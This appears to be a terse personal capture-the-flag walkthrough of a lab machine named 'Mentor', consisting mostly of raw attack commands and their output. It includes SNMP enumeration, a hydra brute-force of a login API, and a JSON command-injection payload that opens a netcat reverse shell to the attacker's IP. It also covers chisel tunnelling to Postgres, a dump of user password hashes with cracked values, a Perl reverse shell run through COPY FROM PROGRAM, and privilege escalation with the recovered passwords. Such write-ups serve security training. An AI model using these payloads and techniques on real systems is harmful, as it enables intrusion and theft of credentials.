# Mentor

## Enumeration
### Nmap
OS: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SSH: OpenSSH 8.9p1
HTTP: Apache httpd 2.4.52
            CVE-2022-22720
      Werkzeug/2.0.3 Python/3.6.9
SNPM (UDP): SNMPv1 server; net-snmp SNMPv3 server (public)

### Web enumeration

### SNMP
Community string: public (msf)
Emails/users: Me admin@mentorquotes.htb
VM: vmlinuz-5.15.0-56-generic
```bash
$ snmp-check $URL -p 161 -c public                                                             kali@kali
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.109.43:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.129.109.43
  Hostname                      : mentor
  Description                   : Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
  Contact                       : Me <admin@mentorquotes.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 02:52:06.65
  Uptime system                 : 02:51:54.62
  System date                   : 2022-12-11 18:04:04.0
```

Internal:
iso.3.6.1.2.1.25.4.2.1.5.1696 = STRING: "/usr/local/bin/login.sh"
iso.3.6.1.2.1.25.4.2.1.5.2121 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"


## /API Enumeration
### Web
james:james@mentorquotes.htb:

## Pwn
$ hydra -l james -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -s 80 api.mentorquotes.htb http-post-form "/auth/login:{\"email\"\: \"james@mentorquotes.htb\",\"username\"\: \"^USER^\",\"password\"\: \"^PASS^\"}:detail"
$ john token.txt

## User
/admin/backup
```json
{
    "backup": "RCE",
    "path": "/etc/passwd$(nc 10.10.16.6 9001 -e sh)"
}
```

root $ cat /home/svc/user.txt
fb23282b8c488b1d11c1b894c662e5c8

Docker environment

GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
SECRET=76dsf761g31276hjgsdkahuyt123

DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

## DB Lateral movement
host> chisel server --port 9003 --reverse
docker> ./chisel client -v 10.10.16.6:9003 R:5432:172.22.0.1:5432

$ psql -h 127.0.0.1 -p 5432 -Upostgres -d mentorquotes_db
Password: postgres

psql > mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | user1@mentorquotes.htb | james       | 25d55ad283aa400af464c76d713c07ad

25d55ad283aa400af464c76d713c07ad:12345678
53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani

psql> COPY cmd_exec FROM PROGRAM 'perl -e ''use Socket;$i="10.10.16.6";$p=9005;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};''';

## SVC
SSH svc:123meunomeeivani

svc $ cat user.txt
fb23282b8c488b1d11c1b894c662e5c8

svc $ cat /etc/snmp/snmpd.conf
SuperSecurePassword123__

svc $ su james

## James
james $ sudo cat /root/root.txt
304ffdbae0104f603771dd54a2e66486
